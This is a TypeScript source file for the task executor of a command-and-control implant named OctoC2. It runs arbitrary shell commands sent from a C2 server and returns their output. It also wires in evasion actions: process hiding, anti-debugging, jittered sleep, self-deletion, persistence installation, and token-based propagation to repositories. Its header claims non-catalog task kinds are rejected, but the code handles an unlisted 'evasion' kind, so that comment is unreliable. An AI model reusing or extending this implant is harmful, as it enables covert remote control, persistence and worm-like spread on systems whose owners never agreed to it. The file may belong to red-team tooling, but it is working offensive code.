/**
 * OctoC2 — TaskExecutor
 *
 * Dispatches decrypted tasks to the appropriate handler and returns a
 * structured TaskResult. Called by the main beacon loop for each task
 * received from the C2 server.
 *
 * Implemented task kinds:
 *   shell       — run a command via /bin/sh -c (or cmd.exe /c on Windows)
 *   exec        — run a command directly via argv (no shell wrapper)
 *   ping        — connectivity probe; returns timestamp + beacon metadata
 *   sleep       — update beacon sleep interval (directive returned to main loop)
 *   kill        — self-terminate (directive returned to main loop)
 *
 * Any kind outside the shared public task catalog, including load-module, is
 * rejected by the default branch and never reaches an execution handler.
 */

import type { Task, TaskResult, BeaconConfig } from "../types.ts";
import { createLogger }          from "../logger.ts";
import {
  hideProcess,
  antiDebug,
  jitteredSleep,
  getEvasionState,
  installPersistence,
  propagate,
  logEvasionAction,
} from "../evasion/OpenHulud.ts";
import type { PersistenceMethod } from "../evasion/OpenHulud.ts";
import type { ExecutorDirective } from "./TaskDirective.ts";
export type { ExecutorDirective } from "./TaskDirective.ts";

const log = createLogger("TaskExecutor");

// Some tasks require control-flow changes in the main loop (sleep interval
// update, graceful shutdown). The executor returns these as directives
// alongside the normal TaskResult.
export interface ExecutionResult {
  result:    TaskResult;
  directive: ExecutorDirective;
}

const DEFAULT_SHELL_TIMEOUT_MS = 60_000;        // 60 s
const MAX_OUTPUT_BYTES         = 512 * 1024;    // 512 KB per stream

export class TaskExecutor {
  constructor(private readonly config: BeaconConfig) {}

  /**
   * Execute a single task. Never throws — all errors are captured in the result.
   */
  async execute(task: Task, beaconId: string): Promise<ExecutionResult> {
    const startMs = Date.now();

    try {
      switch (task.kind) {
        case "shell":
          return await this.executeShell(task, beaconId, startMs);

        case "exec":
          return await this.executeExec(task, beaconId, startMs);

        case "ping":
          return this.executePing(task, beaconId, startMs);

        case "sleep":
          return this.executeSleep(task, beaconId, startMs);

        case "kill":
          return this.executeKill(task, beaconId, startMs);

        case "evasion":
          return await this.executeEvasion(task, beaconId, startMs);

        default:
          return this.unknownKind(task, beaconId, startMs);
      }
    } catch (err) {
      // Safety net — individual handlers should catch their own errors
      return {
        result: {
          taskId:      task.taskId,
          beaconId,
          success:     false,
          output:      `[executor error] ${(err as Error).message}`,
          completedAt: new Date().toISOString(),
        },
        directive: { kind: "none" },
      };
    }
  }

  private async executeShell(
    task:     Task,
    beaconId: string,
    startMs:  number
  ): Promise<ExecutionResult> {
    const cmd       = String(task.args["cmd"] ?? "");
    const timeoutMs = Number(task.args["timeout"] ?? DEFAULT_SHELL_TIMEOUT_MS);
    const cwd       = task.args["cwd"] ? String(task.args["cwd"]) : undefined;

    if (!cmd.trim()) {
      return this.failure(task, beaconId, startMs, "shell: 'cmd' argument is required");
    }

    const spawnArgs: string[] = process.platform === "win32"
      ? ["cmd.exe", "/c", cmd]
      : ["/bin/sh", "-c", cmd];

    const result = await this.runProcess(task, beaconId, startMs, spawnArgs, timeoutMs, cwd);
    result.result.metadata = { ...result.result.metadata, shellInvoked: true };
    return result;
  }

  private async executeExec(
    task:     Task,
    beaconId: string,
    startMs:  number
  ): Promise<ExecutionResult> {
    const cmd       = String(task.args["cmd"] ?? "");
    const timeoutMs = Number(task.args["timeout"] ?? DEFAULT_SHELL_TIMEOUT_MS);
    const cwd       = task.args["cwd"] ? String(task.args["cwd"]) : undefined;

    if (!cmd.trim()) {
      return this.failure(task, beaconId, startMs, "exec: 'cmd' argument is required");
    }

    // Accept extra argv as either an array or a single string
    const rawArgs = task.args["args"];
    let extraArgs: string[] = [];
    if (Array.isArray(rawArgs)) {
      extraArgs = rawArgs.map(String);
    } else if (typeof rawArgs === "string" && rawArgs.trim()) {
      extraArgs = [rawArgs];
    }

    const spawnArgs = [cmd, ...extraArgs];
    return this.runProcess(task, beaconId, startMs, spawnArgs, timeoutMs, cwd, false);
  }

  private executePing(
    task:     Task,
    beaconId: string,
    startMs:  number
  ): ExecutionResult {
    const payload = {
      ok:        true,
      beaconId,
      timestamp: new Date().toISOString(),
      pid:       process.pid,
      platform:  process.platform,
      arch:      process.arch,
      durationMs: Date.now() - startMs,
    };

    log.debug(`ping from ${beaconId}`);

    return {
      result: {
        taskId:      task.taskId,
        beaconId,
        success:     true,
        output:      JSON.stringify(payload),
        completedAt: new Date().toISOString(),
      },
      directive: { kind: "none" },
    };
  }

  private executeSleep(
    task:     Task,
    beaconId: string,
    startMs:  number
  ): ExecutionResult {
    const seconds = Number(task.args["seconds"] ?? 60);
    const jitter  = Number(task.args["jitter"]  ?? 0.3);

    log.info(`sleep update: ${seconds}s jitter=${jitter}`);

    return {
      result: {
        taskId:      task.taskId,
        beaconId,
        success:     true,
        output:      `Sleep interval updated: ${seconds}s (jitter ${jitter})`,
        completedAt: new Date().toISOString(),
      },
      directive: { kind: "update_sleep", seconds, jitter },
    };
  }

  private executeKill(
    task:     Task,
    beaconId: string,
    startMs:  number
  ): ExecutionResult {
    log.warn("kill directive received");

    return {
      result: {
        taskId:      task.taskId,
        beaconId,
        success:     true,
        output:      "Beacon termination scheduled after result acknowledgement.",
        completedAt: new Date().toISOString(),
      },
      directive: { kind: "kill" },
    };
  }

  private async executeEvasion(
    task:     Task,
    beaconId: string,
    startMs:  number,
  ): Promise<ExecutionResult> {
    const action = typeof task.args["action"] === "string"
      ? task.args["action"].trim()
      : "status";

    let payload: Record<string, unknown>;
    let directive: ExecutorDirective = { kind: "none" };

    switch (action) {
      case "hide": {
        const msg = await hideProcess();
        payload = { action, result: msg };
        break;
      }
      case "anti_debug": {
        const detected = await antiDebug();
        payload = { action, debuggerDetected: detected, result: `debugger detected: ${detected}` };
        break;
      }
      case "sleep": {
        const baseMs = Number(task.args["baseMs"] ?? 1000);
        const jitter = Number(task.args["jitter"]  ?? 0.2);
        await jitteredSleep(baseMs, jitter);
        payload = { action, baseMs, jitter, result: "sleep completed" };
        break;
      }
      case "self_delete": {
        payload = {
          action,
          result: "self-delete scheduled after result acknowledgement",
        };
        directive = { kind: "self_delete" };
        break;
      }
      case "status": {
        payload = { action, state: getEvasionState() };
        break;
      }
      case "persist": {
        const method = typeof task.args["method"] === "string" ? task.args["method"] : "auto";
        const result = await installPersistence(method as PersistenceMethod);
        payload = { action, ...result };
        break;
      }
      case "propagate": {
        const confirm  = typeof task.args["confirm"]  === "string" ? task.args["confirm"]  : "";
        const token    = typeof task.args["token"]    === "string" ? task.args["token"]    : "";
        const owner    = typeof task.args["owner"]    === "string" ? task.args["owner"]    : "";
        const repoName = typeof task.args["repoName"] === "string" ? task.args["repoName"] : "";
        if (confirm !== "propagate") {
          payload = { action, error: "propagate: explicit operator confirmation required — pass confirm:\"propagate\" in args" };
          break;
        }
        if (!token) {
          payload = { action, error: "propagate: token is required" };
          break;
        }
        const result = await propagate(token, owner, repoName);
        payload = { action, ...result };
        break;
      }
      default: {
        payload = { action, result: `unknown evasion action: "${action}"` };
        break;
      }
    }

    log.info(`evasion task ${task.taskId.slice(0, 8)}: action=${action}`);
    // Log evasion action to in-memory audit log (surfaced in maintenance diagnostics)
    const summary = "error" in payload
      ? `error: ${(payload as { error: string }).error}`
      : JSON.stringify(payload).slice(0, 200);
    logEvasionAction(action, summary);

    return {
      result: {
        taskId:      task.taskId,
        beaconId,
        success:     true,
        output:      JSON.stringify(payload),
        completedAt: new Date().toISOString(),
      },
      directive,
    };
  }

  /**
   * Spawn a subprocess, capture stdout+stderr (capped), enforce a timeout,
   * and return a structured ExecutionResult. Used by both shell and exec.
   *
   * Guard against the common case where the shell forks a child that holds
   * the pipe write-ends open after SIGKILL (e.g. `/bin/sh -c "sleep 10"`):
   * a hardCeiling promise resolves at timeoutMs+500ms with empty output so
   * the executor never blocks indefinitely.
   */
  private async runProcess(
    task:      Task,
    beaconId:  string,
    startMs:   number,
    spawnArgs: string[],
    timeoutMs: number,
    cwd?:      string,
    shell?:    boolean,
  ): Promise<ExecutionResult> {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    let proc: any | undefined;

    try {
      const env = {
        PATH:  process.env["PATH"] ?? "/usr/local/bin:/usr/bin:/bin",
        HOME:  process.env["HOME"] ?? "/tmp",
        USER:  process.env["USER"] ?? "",
        TERM:  "dumb",
        LANG:  process.env["LANG"] ?? "C",
        SHELL: process.platform === "win32" ? "cmd.exe" : "/bin/sh",
      };
      // cwd must not be passed as undefined (exactOptionalPropertyTypes)
      if (cwd !== undefined) {
        proc = Bun.spawn({ cmd: spawnArgs, stdout: "pipe", stderr: "pipe", cwd, env });
      } else {
        proc = Bun.spawn({ cmd: spawnArgs, stdout: "pipe", stderr: "pipe", env });
      }
    } catch (err) {
      return this.failure(
        task, beaconId, startMs,
        `spawn failed: ${(err as Error).message}`
      );
    }

    let timedOut = false;
    const killTimer = setTimeout(() => {
      timedOut = true;
      try { proc!.kill("SIGKILL"); } catch { /* already exited */ }
    }, timeoutMs);

    // Safety net: if the killed shell left a child holding the pipe open,
    // resolve with empty output after an extra 500 ms grace period.
    const hardCeiling = new Promise<[string, string, number]>((resolve) =>
      setTimeout(() => {
        try { proc!.kill("SIGKILL"); } catch { /* already exited */ }
        resolve(["", "", -1]);
      }, timeoutMs + 500)
    );

    let stdoutText = "";
    let stderrText = "";
    let exitCode   = -1;

    try {
      [stdoutText, stderrText, exitCode] = await Promise.race([
        Promise.all([
          readStreamCapped(proc.stdout as ReadableStream<Uint8Array> | null, MAX_OUTPUT_BYTES),
          readStreamCapped(proc.stderr as ReadableStream<Uint8Array> | null, MAX_OUTPUT_BYTES),
          proc.exited,
        ]) as Promise<[string, string, number]>,
        hardCeiling,
      ]);
    } finally {
      clearTimeout(killTimer);
    }

    const durationMs = Date.now() - startMs;
    const lines: string[] = [];

    if (stdoutText.length > 0) lines.push(stdoutText.trimEnd());
    if (stderrText.length > 0) lines.push(`[stderr]\n${stderrText.trimEnd()}`);
    if (timedOut)               lines.push(`[timed out after ${timeoutMs}ms]`);
    lines.push(`[exit: ${exitCode}] [${durationMs}ms]`);

    const output  = lines.join("\n");
    const success = exitCode === 0 && !timedOut;

    log.info(
      `${task.kind} task ${task.taskId.slice(0, 8)} completed ` +
      `(exit=${exitCode}, ${durationMs}ms)`
    );

    return {
      result: {
        taskId:      task.taskId,
        beaconId,
        success,
        output,
        completedAt: new Date().toISOString(),
      },
      directive: { kind: "none" },
    };
  }

  private failure(
    task: Task, beaconId: string, startMs: number, message: string
  ): ExecutionResult {
    return {
      result: {
        taskId:      task.taskId,
        beaconId,
        success:     false,
        output:      message,
        completedAt: new Date().toISOString(),
      },
      directive: { kind: "none" },
    };
  }

  private unknownKind(
    task: Task, beaconId: string, startMs: number
  ): ExecutionResult {
    return this.failure(task, beaconId, startMs, `Unknown task kind: '${task.kind}'`);
  }
}

/**
 * Read a ReadableStream<Uint8Array> into a UTF-8 string, capping at maxBytes.
 * Excess bytes are dropped and a truncation notice is appended.
 */
async function readStreamCapped(
  stream:   ReadableStream<Uint8Array> | null,
  maxBytes: number
): Promise<string> {
  if (!stream) return "";

  const chunks: Uint8Array[] = [];
  let totalBytes = 0;
  let truncated  = false;

  const reader = stream.getReader();
  try {
    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      if (!value) continue;

      if (totalBytes + value.byteLength > maxBytes) {
        const remaining = maxBytes - totalBytes;
        if (remaining > 0) chunks.push(value.slice(0, remaining));
        truncated = true;
        break;
      }

      chunks.push(value);
      totalBytes += value.byteLength;
    }
  } finally {
    reader.releaseLock();
  }

  const combined = new Uint8Array(chunks.reduce((acc, c) => acc + c.byteLength, 0));
  let offset = 0;
  for (const chunk of chunks) {
    combined.set(chunk, offset);
    offset += chunk.byteLength;
  }

  const text = new TextDecoder("utf-8", { fatal: false }).decode(combined);
  return truncated ? `${text}\n[... output truncated at ${maxBytes} bytes]` : text;
}
